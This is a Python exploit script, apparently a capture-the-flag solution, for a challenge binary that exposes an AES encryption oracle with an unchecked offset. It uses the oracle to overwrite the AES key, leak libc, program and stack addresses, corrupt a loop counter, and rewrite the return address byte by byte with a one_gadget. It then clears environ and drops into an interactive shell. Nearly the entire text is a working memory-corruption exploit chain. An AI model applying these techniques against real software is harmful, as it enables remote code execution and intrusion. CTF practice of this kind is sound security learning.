from ptrlib import *
from Crypto.Cipher import AES

def encrypt(offset, size):
    sock.sendlineafter(":", str(offset))
    sock.sendlineafter(":", str(size))
    result = sock.recv((size & ~0xf) + 16)
    return result

def test_encrypt(key, msg):
    return AES.new(key, AES.MODE_CBC, iv=b'\0'*16).encrypt(msg)

def decrypt(key, msg):
    return AES.new(key, AES.MODE_CBC, iv=b'\0'*16).decrypt(msg)

libc = ELF("./libc.so.6")
elf = ELF("./chall")
sock = Process("./chall")
#sock = Socket("3.113.219.89", 31337)

# set new key
addr_buf = elf.symbol("buf")
addr_key = elf.symbol("AESkey")
addr_stderr = elf.section(".bss") + 0x20
key = encrypt(addr_key - addr_buf, 15)
logger.info(b"New key = " + key)

# leak libc
leak = decrypt(key, encrypt(addr_stderr - addr_buf, 15))
libc_base = u64(leak) - libc.symbol("_IO_2_1_stderr_")
logger.info("libc base = " + hex(libc_base))

# leak proc
leak = decrypt(key, encrypt(0x202000 - addr_buf, 15))
proc_base = u64(leak[8:]) - 0x202008
logger.info("proc base = " + hex(proc_base))

# leak stack
addr_environ = libc_base + libc.symbol("environ")
addr_buf += proc_base
addr_key += proc_base
new_environ = encrypt(addr_environ - addr_buf, 15)
leak = decrypt(key, new_environ)
stack_i = u64(leak) - 0x120
logger.info("stack i = " + hex(stack_i))

# overwrite i
addr_dl_fini = libc_base + 0x4019a0
cnt = 4
for i in range(0x20 - 4):
    new_i = u32(test_encrypt(key, p64(addr_dl_fini) + p32(cnt) + p32(1))[8:12])
    if new_i >> 31:
        logger.info("i = " + str(-((new_i ^ 0xffffffff) + 1)))
        encrypt(stack_i - 8 - addr_buf, 15)
        break
    else:
        key = encrypt(addr_key - addr_buf, 15)
        logger.info(b"New key = " + key)
        cnt += 1

# overwrite return address to one gadget
addr_retaddr = stack_i + 0x30
buf = p64(libc_base + 0x21b97) + p64(1) + p64(stack_i + 0x110)
addr_one_gadget = libc_base + 0x10a38c
for i in range(8):
    while True:
        new_buf = encrypt(addr_retaddr + i - addr_buf, 15)
        buf = buf[:i] + new_buf + buf[i+16:]
        if new_buf[0] == (addr_one_gadget >> (i*8)) & 0xff:
            break
logger.info("Successfully set one_gadget")

# overwrite environ with NULL
buf = new_environ + p64(0)
for i in range(8):
    while True:
        new_buf = encrypt(addr_environ + i - addr_buf, 15)
        buf = buf[:i] + new_buf + buf[i+16:]
        if new_buf[0] == 0:
            break
logger.info("Successfully set environ")

# get the shell!
sock.sendlineafter(":", "+")
sock.interactive()
